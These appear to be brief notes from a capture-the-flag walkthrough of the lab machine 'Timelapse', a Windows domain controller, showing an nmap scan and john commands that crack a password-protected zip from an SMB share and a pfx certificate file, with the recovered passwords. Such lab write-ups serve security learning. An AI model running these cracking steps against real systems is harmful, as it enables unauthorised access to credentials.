#Windows #active-directory 

# nmap 

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-12 10:27 CDT
Nmap scan report for 10.129.5.22
Host is up (0.21s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-10-12 23:27:54Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-10-12T23:28:13
|_  start_date: N/A
|_clock-skew: 7h59m57s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

# Found a zip file on the smb share, downloaded it but it's password protected, decrypted it using john 

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash 

supremelegacy

thuglegacy

```

# pfx file also has password, cracked it again using john

```shell
pfx2john file.pfx > pfx.hash
john --wordlist=/usr/share/wordlist/rockyou.txt pfx.hash

thuglegacy
```